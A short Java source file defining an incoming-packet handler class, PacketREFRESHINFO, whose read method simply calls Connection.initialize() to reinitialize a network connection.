package com.redpois0n.packets.in;

import com.redpois0n.Connection;

public class PacketREFRESHINFO extends AbstractIncomingPacket{

	@Override
	public void read() throws Exception {
		Connection.initialize();
	}

}
